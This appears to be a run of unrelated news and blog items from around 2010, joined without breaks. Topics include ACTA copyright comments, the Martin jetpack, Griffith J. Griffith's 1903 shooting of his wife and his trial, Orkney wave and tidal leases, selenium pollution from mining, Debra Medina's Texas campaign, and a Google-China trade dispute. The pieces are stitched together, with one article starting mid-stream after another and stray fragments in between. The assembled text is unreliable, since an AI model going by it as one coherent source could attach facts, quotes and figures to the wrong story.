You 've got nine days left to file comments for Victoria Espinel , the Obama administration 's new copyright enforcement czar , and her department 's inquiry on how the US should best enforce copyrights .
Given that the president himself has spoken out in favor of the secret and sinister Anti-Counterfeiting Trade Agreement ( AKA ACTA — a punishing copyright treaty that seeks to expand the American DMCA and push it around the world ) , and that he plans to bring it down by executive order , without an act of Congress , this is especially urgent .
The good folks at Public Knowledge have worked up a tool to help you file comments , along with a good , easy - to - follow briefing on issues that Ms Espinel needs to hear about .
The Joint Strategic Plan should carefully examine the basis for claims of losses due to infringement , and measure credible accounts of those losses against all of the consequences of proposed enforcement measures , good and bad .
Measures like cutting off Internet access in response to alleged copyright infringement can do more harm than good .
Internet connections are not merely entertainment or luxuries ; they provide vital communication links , often including basic phone service .
This is even more clearly unfair in cases where users are falsely or mistakenly accused .
Internet service providers should not be required or asked to violate users ' privacy in the name of copyright enforcement beyond the scope of the law .
Efforts to require or recommend that ISPs inspect users ' communications should not be part of the Joint Strategic Plan .
Alert : Tell the Government to Support Balanced Copyright !

The Martin jetpack can fly for 30 minutes on a five - gallon tank of gas , reaching a top speed of 60 mph .
Credit : Martin Aircraft Company .
Taking a leap into the future , the New Zealand - based Martin Aircraft Company plans to start selling commercial jetpacks to anyone with an interest and $ 75,000 .
As a recent article in The Telegraph has reported , Martin has partnered with an unnamed international aircraft company , resulting in enough capital to produce 500 jetpacks per year .
The partnership has brought the jetpacks closer to reality compared with a year ago , when Martin ’s goal was to produce 10 units at $ 100,000 each .
As Martin jetpack inventor Glenn Martin demonstrates in the video below , the 200 - horsepower , dual - propeller jetpacks seem to offer all that one could hope for in a personal flying machine .
The jetpack can travel for about 30 minutes on a five - gallon tank of premium gasoline ( the same used by cars ) .
Tests have shown that the jetpack can reach top speeds of 60 mph , giving it a range of 30 miles per tank .
The newest model can also reach heights of 2,400 meters ( about 1.5 miles ) .
Video demonstration of the Martin jetpack
Since the jetpacks weigh less than 254 pounds , they do n’t require a pilot ’s license to fly .
However , Martin says that buyers will be required to go through training before taking to the skies .
The jetpack is also equipped with a low - altitude emergency parachute .
The jetpack , which can lift up to 120 kilograms ( 265 pounds ) , has two propellers that generate lift .
The air in the propellers moves at about 300 km per hour , creating an upward thrust .
The pilot uses both hands to fly , one on the throttle and one for steering .
A flight display in front reveals information such as what the engines are doing and where it ’s going .
If the pilot lets go of the controls , the jetpack hovers in one spot .
This self - righting mechanism occurs since the center of mass is below the jetpack ’s center of pressure , which is located at the bottom of the ducts ( near the pilot ’s shoulders ) .
Although the company is on the cusp of commercialization , the project itself has been almost 30 years in the making .
Glenn Martin began working on a concept in 1981 , which was later verified by the University of Canterbury ’s Mechanical Engineering Department .
In 2005 , the ninth prototype achieved sustained flight times , laying the foundation for pre-production development .
Later this year , Martin plans to begin production of the jetpacks at an undisclosed location outside of New Zealand .
The company plans to market the jetpacks to emergency services , the military , and private users .
As volume increases , according to its website , the cost may decrease to that of a “ mid - range motorcycle or car . ”

He has set up a new site to do “ Real - Time Tracking of the US Economy Using Withholding Tax Revenue : ” : The Daily Jobs Update .
Here ’s Matt :
“ I ’m thinking that if payrolls stay flat , the annual growth rate can move up to zero .
But to move above zero will require that some new net jobs get created .
I hope we get that , but in 2002 we had a massive real - estate building spree going on and creating jobs for every body from copper miners to i-bankers .
We do n’t have anything like that today .
So , I do worry that we wo n’t be able to run up to +8 % as fast as we did last time . ”
And of course , Matt has some new charts for us :
This is the daily plot of the annual growth rate of the raw data .
Matt observes we are making the same pattern that we did at the bottom of the last recession in 2002 .

The next chart is also an annual , but plotted every 12 days to smooth the line .
Its also adjusted to reflect when the April 2009 withholding tax credit went into effect .

I UNDERSTAND
As poor Christina cowered trembling on the floor , Griffith calmly asked if she had ever been unfaithful to him .
Christina sobbed in terror , " Oh , Papa , you know I have always been true to you . "
Griffth was convinced that the Pope in Rome , working through his Catholic wife , wanted to have him murdered .
Christina tried to reason with her husband but the only sounds she could force from her throat were horrified sobs .
She felt the cold steel of the barrel press hard against her temple .
She flinched .
And as she did , Griffith pulled the trigger .
The bullet exploded into her left eye , blowing her eyeball apart .
She screamed in terror and agony , and impulsively threw herself out the nearest window .
*
She tumbled helplessly down two stories , landing on the hotel veranda ’s sunshade , breaking her leg .
Fear drove her to crawl through an open second story window into an empty room .
She pressed a towel into the bloody cavity in her head , and only then did she scream for help .
Two men responded .
By chance the first to arrive was the hotel ’s manager , Mr. Wright .
The second was her husband , the murderous Mr. Griffith .
Christina screamed , " He shot me !
He ’s crazy ! "
Griffith calmly assured the manager that Christina had accidently shot herself .
But the manager insisted upon calling the sheriff .
*
In a couple of hours the 100,000 residents of the young metropolis of Los Angeles were electrified to hear newsboys on every street corner shouting that one of the town 's most prominent citizens , the man who just seven years earlier had donated 4,000 acres for a city park , a generous supporter of the temperance league and a well respected and well connected businessman , was so " crazy drunk " that he had tried to murder his wife in broad daylight .
*
Over night the 51 year old Griffith became the most hated man in Los Angeles .
On Tuesday September 8th .
Griffith was unanimously removed from the city Parks Commission and the Los Angeles Times suggested that " Griffith Park " was " handicapped so signally by its name " that it should be returned to its donor .
The park ’s highest peak , Mt. Griffith , became Mt. Hollywood .
People now remembered Griffith as " ... a roly - poly , pompous little fellow " , a " midget egomaniac " and a " vain little Napoleon " who wore heel length coats and carried a gold headed walking cane .
*
He was also the man who had held the city ’s access to drinking water from the L.A. River hostage for a $ 50,000 payment .
The land he had used in this maneuver was the very same Rancho Los Feliz that he later donated to the city as Griffith Park , for which he was awarded a significant tax deduction .
*
And Griffith ’s behavior after the shooting did little to quell the public ’s outrage .
Released on bail he repeated his allegation that Christina had shot herself , and then assured the public that his social position would protect him from conviction .
When Christina , now called " the society wife who refused to die " , filed for divorce the " Colonel " contested the custody of their son , which made Griffith appear not just crazy but cruel .
*
His lawyers did their best to repair the damage , leaking to the Los Angele Examiner that " Mrs. Griffith ... believed her husband was insane and she thought he should be locked up , but she was averse to a swearing of a felony complaint against him .... "
Christina did not take the hint .
*
By this time Christina 's family , as wealthy and powerful as Griffith , had hired a team of lawyers , including Henry Gage , a former governor , and Isadore Dockweiler , a powerful trial lawyer .
They immediately went on the offensive .
The victim , now blind in one eye and forever disfigured , submitted to a deposition under oath , which was released to the press .
She insisted that " .... her husband was sober on the night of the shooting ... ( and ) had not been drinking during the day ... "
In other words , they were not going to accept a deal to save her husband .
*
Now beginning to panic , Griffith ’s lawyers sought a change of venue .
That was quickly denied .
Just five days before the trial was scheduled to begin Griffith hired a young new lawyer named Earl Rogers .
He immediately filed for a delay , and the prosecution prepared arguments to smack Rogers down .
But on the first day of the trial , the day after Valentine 's Day , Monday , February 15th. , 1904 , Rogers caught the prosecutors off stride by suddenly withdrawing his motion .
The trial games had begun .
*
The L.A. Times described the jockeying in the court room amongst the mob of lawyers .
" Rogers would ask a question ; the District Attorney would object ; retort to the D. A. would follow from ( defense lawyer ) Maj .
Jones ; slap back at Jones from Dockweiler ; dig at Dockweiler from ( defense lawyer ) McKinley ; swat at McKinley from Mr. Gage ; crack at Gage from Luther Brown ( yet another defense lawyer ) . "
Meanwhile , on the witness stand , there were battling psychiatrists and battling bartenders .
*
Griffith ’s doctors said he was insane and his bartenders swore that he drank two quarts of whiskey a day .
Griffith , it seemed , was a man of many paranoia .
A devout Methodist , Griffin had often lectured at his men's club on the conspiracies of the Catholic Church .
Combined with his ego , these beliefs convinced the " Colonel " that through his devoutly Catholic wife , the Pope was seeking to assassinate him .
*
Restaurant waitresses testified of his habit of suddenly exchanging dinner plates with his wife .
When asked , he explained " ... you never knew when a meal might be poisoned " .
A local doctor testified that many years before Griffith had come to him with a bottle of wine and said he thought it was poisoned .
Asked what he did with the wine the doctor blandly replied , " I drank it . "
*
There were so many lawyers in the courtroom that it was barely noticed when the defense called another as a witness .
A member of the county Republican Committee , Oscar Lawler , described a lunch at which Griffith promised not to run for mayor , because , he said , if he did , no one else would stand a chance .
Griffin even expected the Democrats to stand aside for him .
Lawler thought Griffith was joking and suggested that Griffith should run for President .
Griffith replied seriously , " I think so myself . "
Lawler testified that from that moment on , he believed Griffith to be insane .
*
It turned out , so did the jury .
After two days of deliberations , on March 3rd. , 1904 , they rejected the charge of attempted murder , and instead found Griffith guilty of assault with a deadly weapon , a misdemeanor .
The frustrated judge then sentenced Griffith to the maximum allowed , just two years in prison .
The public was outraged all over again .
*
The trial made Earl Rogers famous .
He was the inspiration for Erle Stanley Gardner ’s character , Perry Mason .
However such talent and success in the courtroom did require some moral compromises .
After hearing himself declared not guilty one client rushed to shake Roger ’s hand , but the lawyer responded , " Get away from me , you slimy pimp .
You know you ’re guilty as hell ! "
Well , perhaps Rogers understood Griffith ’s alcoholic paranoia so well because he himself was an alcoholic .
*
Rogers died in 1922 " broke and alone in a Los Angeles boarding house " of liver failure at the age of 52 .
His daughter , famous L.A. newswoman in her own right , Adela Rogers St. John , wrote his biography , " Final Verdict " , which was published in 1962 .
*
Griffith served his time in San Quentin State Prison .
Once denied access to alcohol , his insanity evaporated .
He turned down a job in the prison library , and instead made burlap sacks .
Released in late 1906 he returned to Los Angles , living quietly .
The only subject he lectured on now was prison reform .
In 1912 he offered the city $ 100,000 to build an observatory , saying , " Ambition must have broad spaces and mighty distances . "
A prominent citizen responded that , " This community is neither so poor nor so lost to a sense of public decency that it can afford to accept this money . "
The next year Griffith sweetened the offer with $ 50,000 to build an outdoor Greek theatre .
The city even protested his planning for the project .
So Griffith put both bequests in his will .
*
Griffith J. Griffith died of liver disease on July 6 , 1919 .
His bequests were carried through and overseen by his son , Van , - as was the erecting of a statue of his father near the park ’s main entrance .
Today the observatory and the Greek theatre are highlights of Griffith Park , the jewel of Los Angeles .

Winning bidders for a series of marine energy development sites off Scotland ’s Pentland Firth and Orkney islands have been named in the world ’s first commercial wave and tidal leasing round .
The Crown Estate – which controls the UK seabed out to 12 nautical miles – launched the Pentland Firth and Orkney Waters leasing round in November 2008 and attracted more than 40 bids for seabed leases from 20 marine energy developers and utilities .
Following its closure , in May 2009 , The Crown Estate noted that the applications ranged from 10 MW demonstration sites all the way up to the highest band of 200- 300 MW commercial sites .
Under the terms of the bidding process , 600 MW each from wave and tidal is planned by 2020 .
Roger Bright CB , CEO of The Crown Estate said : “ The 1.2 GW of installed capacity proposed by the wave and tidal energy developers for 2020 , shows the world that marine energy can produce meaningful amounts of electricity and offers a real alternative to conventional power production .
The long - term prospects for this growing industry are exceptionally bright , with vast amounts of untapped energy in the seas all around the UK .
It will create new businesses and jobs as well as attracting inward investment . ”
Among those companies keen to secure access to one of the world ’s most favourable locations in terms of marine energy resources are Marine Current Turbines ( MCT ) , recently the beneficiary of a significant equity buy from Siemens .
It gained approval for a lease from The Crown Estate to deploy its SeaGen tidal current technology off Brough Ness , on the southern most tip of the Orkney Islands ( South Ronaldsay ) and north east of John O’Groats .
MCT is planning to install 66 SeaGen tidal turbines in three phases over a four year period in a site area of 4.3 square kilometres .
The Brough Ness tidal array will have a total generating capacity of 99 MW from the 1.5 MW units .
Subject to financing and final agreements with The Crown Estate , MCT is aiming to secure planning and environment consents for Brough Ness by 2015 , to start construction in 2016 and the first phase of deployment in 2017 .
The company plans to have the whole scheme operational by 2020 .
Martin Wright , MCT managing director , said : “ The Pentland Firth and Orkney waters are strategically the most important marine energy areas in Western Europe . ”
He added , “ MCT already has the valuable experience of deploying and operating SeaGen in Northern Ireland ’s Strangford Lough and within the next two to three years we expect to have deployed our first tidal farm in UK waters . ”
However , the company also warned that timing of construction and deployment will be dependent on the local grid infrastructure being strengthened .
In another of the leasing deals , wave energy technology company Aquamarine Power and utility group SSE Renewables have secured rights to develop a 200 MW wave farm , also at Brough Head .
The proposed phased deployment of the company ’s Oyster devices in small clusters over a stretch of coastline from Costa Head in the north of Orkney to Neban Point in the south - west , is due in 2013 .
The proposals form part of an agreement between the two companies to develop up to 1 GW of Oyster wave farm sites in the UK and Ireland by 2020 .
They say they will now work closely with The Crown Estate , Orkney Islands Council and other key stakeholders to obtain necessary consents .
Martin McAdam , Aquamarine Power ’s CEO said : “ The Crown Estate ’s leasing round is a significant milestone for the marine energy sector and is a key step towards the industry ’s commercialisation , enabling it to meet its full potential to deliver clean sustainable power as well as highly skilled long - term employment . ”
The developers which have signed a total of 10 agreements for lease under the Pentalnd scheme are :
Wave :
SSE Renewables Developments Ltd , 200 MW for Costa Head site
Aquamarine Power Ltd & SSE Renewables Developments Ltd , 200 MW for Brough Head site
Scottish Power Renewables UK Ltd , 50 MW for Marwick Head site
E.ON , 50 MW for West Orkney South site
E.ON , 50 MW for West Orkney Middle South site
Pelamis Wave Power Ltd , 50 MW for Armadale site .
Tidal :
SSE Renewables Developments ( UK ) Ltd , 200 MW for Westray South site
SSE Renewables Holdings ( UK ) Ltd & OpenHydro Site Development Ltd , 200 MW for Cantick Head site
Marine Current Turbines Ltd , 100 MW for Brough Ness site
Scottish Power Renewables UK Ltd , 100 MW for Ness of Duncansby site .
Bright added : “ This announcement demonstrates the UK ’s position as the leader in wave and tidal technologies .
Through our experience and some of the best natural resources in the world we have been able to launch the first wave and tidal energy projects on a commercial scale . ”
The Crown Estate says it will use option fees paid by developers and an equivalent investment from its own funds in order to reduce commercial risks associated with the technology deplyment and accelerate the development of tidal and wave energy projects in the area .
The Pentland Firth strategic area development comes only a day after the Department of Energy and Climate Change published the government ’s Marine Energy Action Plan which sets out the steps necessary drive the UK ’s marine energy industry to 2030 .
It outlines the actions required by both private and public sectors to facilitate the sector and covers wave , tidal range and tidal stream energy .
It is envisioned that marine renewable energy could play an important role in the period to 2020 as the sector begins to roll out larger arrays of devices , saying that wave and tidal stream could deliver 1 - 2 GW of installed capacity by then .
Although aspirational and challenging , the government believes it is broadly realistic if all stakeholders are able to put in place the appropriate mechanisms to enable this level of deployment .
From this it then provides a suitable platform on which to build larger scale deployment to 2030 and beyond , the government says .
According to the document , estimates indicate that the practical resource level for wave energy in the UK waters is of the order 50 TWh / year , while the total UK tidal stream potential is indicated to be of the order of 17 TWh / year .
Key recommendations made in the strategy document include forming a UK - wide strategic co-ordination group to develop a planning and consenting roadmap for all types of marine renewables ; consideration of support levels for marine technologies under the review of banding of the Renewables Obligation in Autumn 2010 ; ensuring that the appropriate levels of targeted funding are available to bridge the technology market failures that exist in this developing sector , subject to the budgets in the next public spending round ; leveraging private equity , and in the longer term , project capital into the sector ; establishing guidelines and best practice in the development of new technologies ; and , building a UK marine energy supply chain utilising the current skills base from the offshore wind , oil and gas , and maritime industries .
The document also highlights the potential for the marine energy sector to provide up to 16,000 jobs , with a quarter of these in exports .
Commenting on the strategy , Lord Hunt of Kings Heath , Minister of State for Energy said : “ This Action Plan sets out our vision for what marine energy can do for the UK and what we need to do to make it happen .
I look forward to working with industry and other partners to get the most out of our waters and build a new , world - leading energy generation sector in the UK . ”
Lord Hunt also announced the establishment of a Ministerial Task Force on Marine Energy , which will bring together key players to oversee future work on the Marine Energy Action Plan .

Dead and deformed fish indicate selenium pollution from mountaintop coal mining is causing permanent damage to the environment and poses serious health risks , says a Wake Forest University biologist who will brief U.S. Senators on his research Feb. 23 .
Selenium pollution affects fish first , so they are the best barometer for understanding the threat to ecosystems downstream from mountaintop removal mining operations , says Dennis Lemly , research professor of biology , who advocates a ban on the process .
" We 're killing fish right now with selenium pollution from mountaintop removal mining , " says Lemly .
Toxic levels of selenium were found in 73 of 78 stream samples .
The threat is expanding as use of this destructive process expands .
Once these ecosystems are polluted , damage to the environment is permanent . "
Mountaintop removal mining , which has doubled in the past eight years , blasts the top off a mountain and pushes the excess rock to the neighboring valley to get to the coal beneath .
Over the past two decades , mountaintop removal mining in Appalachia has buried more than 1,000 miles of streams .
Most common in the Appalachian mountains of West Virginia , Virginia and Kentucky , this type of mining causes toxic levels of selenium to leach into rivers and streams .
Lemly , who supports tougher regulations on the disposal of coal waste , was part of a team of 12 ecologists and engineers who provided the first comprehensive analysis of damage done by mountaintop removal mining .
He and his colleagues will also share their scientific findings Feb. 23 with representatives of the Environmental Protection Agency and the President 's Council on Environmental Quality .
High levels of selenium threaten fish survival and reproduction .
If they do reproduce , contaminated fish have offspring with serious birth defects .
Lemly has found that newly hatched fish have crooked spines and deformed heads due to high levels of selenium .
They cannot survive and reproduction will fail , he says .
He warns the fish population could be wiped out .
" Once in the aquatic environment , waterborne selenium can enter the food chain and reach levels that are toxic to fish and wildlife , " Lemly wrote in the briefing he prepared .
Lemly has studied West Virginia 's Mud River Reservoir , which was polluted with selenium released from a mountaintop removal coal mining operation .
Fifty to 60 percent of young fish were deformed because of high concentrations of selenium .
Selenium levels in fish caught in some of West Virginia 's rivers are more than twice what is considered safe for human consumption .
Humans need to absorb certain amounts of selenium daily , but extremely high concentrations of selenium can cause reproductive failure and birth defects .
" I specialize in fish , but that is only one part of the overall picture , " Lemly says , " Public health is also an issue with mountaintop removal mining . "
Debra Medina talks at the State Sovereignty Symposium at a hotel in Houston in January .
Medina 's Texas - size momentum
A pistol - packing nurse and home - schooler with close ties to Ron Paul is emerging as a wild card who is reordering the dynamics of the March 2 Texas Republican primary for governor .
Powered by tea party support , Debra Medina ’s rapid climb is raising the prospect that the three - way GOP primary that includes Gov. Rick Perry and Sen. Kay Bailey Hutchison will be decided by an April runoff .
Advertisement
Medina , who has crafted her grass - roots campaign around a sweeping plan to repeal property taxes and an expansion of gun rights , gained significant attention and traction after her colorful appearances alongside Perry and Hutchison in two recent televised debates .
The most recent public polling shows Medina drawing an eye - popping 24 percent , trailing the front - running Perry by 15 percentage points but tracking within just 4 percentage points of Hutchison .
Among self - identified conservatives , she performs even better , outpolling Hutchison 25 percent to 23 percent .
“ It ’s been a year of ‘ you ca n ’t , ’ and we continue to do .
It ’s a pretty exciting place to be .
I think people are really ready for limited government , ” Medina told POLITICO .
“ The bulk of our support is from people who have not voted before in a primary .
If they vote in this primary , we win this race , ” she said .
Despite the momentum , many Republicans say that ’s an unlikely prospect .
For one thing , Perry has held formidable polling leads in his quest for an unprecedented third term while carving out a contingent of the tea party movement for himself .
And while Medina boasts of reeling in more individual donations than Perry or Hutchison during the month of January , she reported having just $ 68,000 remaining to spend at month ’s end .
That cash - on - hand deficit will prohibit her from seriously competing in the television advertising wars , which are integral in the homestretch of a competitive campaign in a state as large as Texas .
“ The candidates that are well - funded will be able to get their messages out through commercials and large get - out - the - vote activities .
This will have a significant impact come Election Day , ” said Texas Republican National Committeewoman Borah Van Dormolen .
Further , while few doubt Medina has surged into double digits as Hutchison ’s numbers have slumped , some believe her support level in the latest survey is inflated .
“ I do n’t think that ’s a sustainable number for Medina against two pretty well - known brand names , ” said Bill Hillsman , a Minneapolis - based political operative who specializes in outsider campaigns and advised Jesse Ventura ’s successful third - party run for governor of Minnesota .
“ I think Medina ’s numbers are probably artificially high right now .
It ’s a protest vote more than anything else .
I think she ’s probably got low double - digit support . ”
Austin , Texas , consultant and lobbyist Bill Miller said Medina is benefiting from Hutchison ’s stalled campaign but finds it inconceivable that she ’d be able to leapfrog the state ’s senior senator , who until recently was thought of as the most popular politician in Texas .
“ Remember , this is Texas , and they like character .
It ’s an asset , and Medina represents a plain - spoken , tough woman .
She ’s got a wind in her sails , and she ’ll have a good showing .
But I think her ultimate impact is someone we ’ll start watching with a following , ” said Miller .
“ I think she ’s between 15 [ percent ] and 20 percent .
That ’s what it feels like to me , ” he added .
What ’s less clear is whether Medina can carve out enough support to force a runoff or even become one of the two remaining candidates — both feats that would be widely seen as a personal victory not only for Medina but also for the scores of anti-establishment candidates running for office in Texas and elsewhere .
To push the March 2 primary to an April 13 runoff , Medina would have to hold Perry , the front - runner , under the magic 50 percent threshold .
.
Mark McKinnon , who served as a strategist for then - Gov. George W. Bush , thinks she ’s proving to be scrappy enough to pull it off but said she ’ll likely hit a ceiling of support that will prevent her from toppling the incumbent
“ Medina has certainly demonstrated she has real and growing support .
At the end of the day , however , I suspect her numbers will dissipate as people do n’t like to throw their votes away on someone they really do n’t believe has a chance to win , ” said McKinnon .
Polls also indicate that outside of tea party and libertarian circles , Medina remains an unknown .
With the election less than three weeks away , 55 percent of Texas voters could not render an opinion of her , according to a recent Public Policy Polling survey .
It would be a mistake , however , to view her solely as the tea party candidate since many tea party factions have remained neutral .
Still , the Independent Texans , a group claiming to represent 5 million voters unaligned with any party , has endorsed Medina ’s candidacy , and Rep. Ron Paul ( R - Texas ) is expected to hold a fundraiser for her in Houston this weekend .
Another independent group has set up a website called “ Medina Money Bomb ” to infuse her campaign with fresh cash Feb. 15 .
Asked if she ’s more accurately described as a tea party or a Paul - oriented candidate , she replied , “ I think both of those shoes fit equally well . ”
Hillsman said Perry is benefiting from the confusion around Medina ’s candidacy , which in many ways is more tailored to independents than to GOP primary voters .
Part of Medina ’s appeal is that she ’s undefined by public office and offers an attractive alternative to a swath of voters seeking candidates without any previous officeholding experience .
Among GOP purists , that ’s not necessarily a redeeming trait .
National committeeman Bill Crocker said many of Medina ’s comments are hard for lifelong Republicans to swallow .
“ She alienated a huge part of the Republican vote when she indicated she would n’t vote for either Perry or Hutchison in the general election .
That just does n’t fly well , ” said Crocker .
With the Massachusetts Senate special election in the rearview mirror , there ’s little chance that sophisticated campaigns will continue to ignore a fast - moving underdog .
“ What helps her avoid a blasting attack is that her supporters ’ second - place preferences are evenly split , ” said Thomas Marshall , a political scientist at the University of Texas at Arlington .
“ Very likely , within a week or two , we should see some hard - hitting ads to stop her momentum .
Perhaps on the drug legalization issue or what her platform would mean for public funding of schools , ” he said .
Some of the more controversial portions of Medina ’s agenda include beginning a conversation about legalizing drugs , replacing the state ’s property tax with a sales tax and removing most registration requirements to carry a handgun .
“ We restrict alcohol in this country , but we do n’t ask people to register all they purchase at the store , ” she said .
Like Perry , Medina suggested secession from the union should be left as an option on the table and has advocated “ nullification , ” a highly charged Civil War -era reference that says states can disregard federal laws .
But taking Medina on directly also raises the risk of elevating her stature .
“ Nobody ’s going to attack her .
That ’d be stupid ; that ’d give her more ammunition , ” Hillsman said .
A couple of days ago , Mrs Hill commented that she could no longer find the Met Office 's seasonal forecast .
We had a bit of a dig around the Met Office website and there indeed seemed to be no mention of a spring forecast .
In the rush of activity after the hearings on Monday , I neglected to follow this up , but the Met Office has now come clean anyway .
The seasonal forecasts are to be scrapped .
The Met Office is to abandon its long - term and seasonal forecasting after criticism for failing to predict extreme weather .
It was berated for not forseeing that the UK would suffer this cold winter or the last three wet summers in its seasonal forecasts .
The forecasts , four times a year , will be replaced by monthly predictions .
It 's hard to see this as a bad thing , given that the Met Office were becoming a laughing stock as a result of their wildly inaccurate predictions .
But wait - here 's a thing .
Remember back to those hearings on Monday .
What was it that Professor Slingo said about climate models ?
At least for the UK the codes that underpin our climate change projections are the same codes that we use to make our daily weather forecasts , so we test those codes twice a day for robustness .
Now , note that she is talking about daily weather forecast not the seasonal ones , so I think there is a reasonable case to make that the forecasts that have been scrapped may be based on a different model to the daily weather forecasts .
But is n't this all a bit odd ?
They can forecast short - term and they can forecast long - term , but in the medium term it 's all too hard ?
It does n't really make sense , does it ?
And then again can it really be the case that the models for the short and long - term are different to the ones for the medium term ?
I claim no particular expertise here ; it just looks rather strange .
Iceland 's parliament has banned striptease in the North Atlantic country and barred clubs from making profit from the nudity of employees , Iceland Review reports .
The ban , which takes effect July 1 in the country of 320,00 people , passed without opposition in the parliament last week .
" It is pleasing how fresh the breeze of equality is at Althingi [ the Icelandic parliament ] these days , " said Siv Fridleifsdótttir of the Progressive Party , the bill 's first sponsor , according to the newspaper Fréttabladid .
Although stripping had generally been banned in the country , the new law puts out of business those few clubs that had been exempted .
Ásgeir Davídsson who runs the strip club Goldfinger in Kópavogur tells the newspaper that the ban reminds him of some countries where almost no part of a woman 's body is allowed to be seen in public .
One of the main factors in the debate over the bill was concern that some women who work at strip clubs are victims of human trafficking and other crimes , Iceland Review reported in an earlier story .

Victoria police have been criticised over attacks on Indian students
Up to 100 police officers are being investigated in the Australian state of Victoria for sharing a racist e-mail .
The message reportedly shows a non -white man being tortured .
Officers being investigated could face dismissal for circulating it on police computers .
The Victoria police force has been criticised for failing to respond adequately to a series of attacks against Indian students in Melbourne .
Earlier this month the police chief admitted some officers were racist .
Computer experts tracking the e-mail found that several had added racist comments before forwarding it on to colleagues , the Melbourne newspaper The Age reports .
It was one of a series of e-mails that were either racist or pornographic in nature , according to the Victoria Police chief Simon Overland .
" It 's offensive and my view is that it would cause significant concern and alarm in the community if the nature of the material was made public , " he said .
Earlier this month , Mr Overland was forced to concede there were racial bigots within the ranks of his force .
This followed a damning report that accused police officers of taunting and beating up an African youth .
Toronto will have lower taxes , better services and a balanced budget in 2011 , Mayor David Miller said at a Wednesday morning news conference .
Miller said the city has a larger surplus -- about $ 100 million more -- than what was originally believed .
The surplus was predicted to be about $ 250 million a couple of months ago when the city released its 2010 budget proposal .
" The numbers a few months ago were an estimate , " he said .
The money will be allocated to a property tax stabilization reserve which will reduce taxes for Torontonians , he said .
The 2010 operating budget proposed a 4 per cent property tax increase for residents .
Now , the unexpected surplus means the expected tax hike will be reduced by 25 per cent to 2.9 per cent and less than one per cent for businesses .
Miller also said the funds will also go towards improving city services and ensuring Toronto has a balanced budget next year as the city is handed over to a new council after this fall 's municipal election .
The extra money is a result of the city 's cost - containment measures , a reduction in property assessment appeals , increases in parking revenues as well as increases in supplementary taxes from the building industry .
The mayor also said the city 's budget committee is taking steps towards implementing a two - year budget blueprint instead of the current one - year plan .
Critics
Current mayoralty candidate George Smitherman slammed the announcement , critisizing the mayor for playing " emotional " games with Torontonians .
He scoffed at the mayor 's suggestion that the surplus could be used to freeze TTC fares in 2011 .
" Why not roll back the ( January 2010 ) fare increase instead of talking about the future year when he wo n't be mayor ?
I think we can do better , " he said .
Coun .
Georgio Mammoliti , who is also running to replace Miller when he steps down in October , questioned the budget committee 's " surprise " surplus discovery .
" How does a city magically find $ 100 million just weeks after releasing a budget ? " he said in a news release issued Wednesday afternoon .
" I for one have had enough of the mayor and his run-and - hide way of running this city of late . "
Rocco Rossi , a Liberal backbencher who is also running for the city 's top job , said the city 's apparent balanced budget appears to depend on receiving financial support from the province -- funds that are never guaranteed .
" At the end of the day , there is only one taxpayer and we want to make sure there 's a plan , " he said .
Rossi said he wants to see the city expand Miller 's idea for a two - year budget plan into one that encompasses the next five years .
The announcement came amid rampant speculation that the news conference would be about the mayoralty race .
Miller 's office sent out a news release Tuesday evening which said nothing more than that an " important " announcement would be made .
Councillors and political pundits said Miller 's team was keeping unusually tight - lipped about the announcement , fuelling speculation the mayor would step down from his post early .
Miller announced late last year that he would not be seeking re-election for a third term .
Miller defended the news release , saying " it 's very important " that the budget has " significantly improved from a couple of months ago . "
Android just got access to a whole new library of pre-written Java - Based applications .
Myriad launched a tool called J2 A ndroid earlier last week .
This tool can be used to convert thousands of MIDlet applications and games already on the market and allows Dalvik to run them .
Chief product officer of Myriad , Malcolm Dawe said :
“ As Android devices appear in greater volumes , the challenge has been how quickly the industry can make apps and content available to cope with user demand .
One obvious source is the catalogue of quality titles already available but locked away in Java format . ”
Myriad is the same company that is working on bring Dalvik Turbo to Android .
This will allow for faster processing of games and apps , this will make Android 3 times faster than it is now .

Should the Google / China spat over censorship start a trade war that puts an end to Chinese - made computers ?
One international trade lawyer argues that it should : " If China shuts out our Internet companies , we need to shut out their hardware that the Internet runs on . "
The sentiment comes from Gil Kaplan , a former Commerce Department official who is now in private practice .
Writing Tuesday at The Huffington Post , Kaplan argued that free trade deals are all about reciprocity — and that the US has opened its markets while China has not .
There had been an implicit agreement about the Internet made between China and the United States .
The United States agreed to lower all its tariffs on high technology manufactured goods to zero , and we agreed to let in all that China could send over here , no questions asked .
What is the result of that ?
The result is that substantially all United States computers are now made in China .
We even went so far as to allow the first U.S. PC maker , IBM , to sell its PC division to a Chinese company , Lenovo ...
Why ?
Because we believed that as China industrialized and moved along the economic and knowledge highway they would become a great market for those goods where we continue to have an advantage , things like search engines , and streaming video , and innovative websites .
We believed they would keep their side of the bargain .
But they have not .
Kaplan is particularly incensed at the number of jobs the semiconductor manufacturing business creates in China .
He singles out Foxconn , which employs several hundred thousand people and makes gear for companies like Apple .
But as China gets the jobs , it continues to block American offerings like YouTube , prevent Western companies from owning businesses outright in China , and favoring local firms .
The current Google / China dispute provides an opportunity to demand that China open up to American business in return for its access to US markets .
If not , well ... who needs all those Chinese - made computers , anyway ?
American consumers and businesses , for one , who like $ 499 iPads .
In addition , China is an old veteran of such trade disputes and is more than willing to take countermeasures .
For instance , back in 2007 , after a US complaint to the World Trade Organization on the issue of China 's ( non ) openness , the Chinese government simply stopped approving US films for distribution .
On the other hand , given how restricted China 's markets already are , Chinese crackdowns on Americans goods would have only limited effects .
When it comes to movies , for instance , China has long restricted the number of approved US pictures each year to a couple dozen .
Dealing with censorship as a trade violation is n't a new idea .
Computer industry lobbying group CCIA was talking up trade complaints as a way to handle Chinese censorship back in January .
CEO Ed Black said at the time , " It is increasingly apparent that censorship is a barrier to trade , and that China cannot limit the free flow of information and still comply with its international trade obligations .
The Chinese government has said it is gathering more information before deciding how to proceed and we would urge that they look at the issue holistically with government , economic and trade officials involved in the decision . "
But Kaplan 's proposal would harm US hardware vendors at the expense of US Web companies — and a company like Apple would no doubt feel some agitation at having its current business model disrupted in order to benefit Google .
As for China 's response to the Google situation , it has n't changed much in the last two months .
Yesterday , a Foreign Affairs spokesman summed it up for the press : " Regarding the impact of Google 's possible withdrawal , I think it is simply an individual business act .
It will not affect the investment environment of China or change the reality that most of the foreign companies , American companies included , have been doing well and making profits in China .
China is firmly committed to opening - up .
Be it domestic companies or foreign firms , they should all respect China 's laws and regulations when doing business in China . "
Thousands of chickens have died in a fire which broke out at a Nottinghamshire barn .
At its height , five crews tackled the fire at the building , which contained 32,000 chickens , on Cotgrave Road in Stragglethorpe .
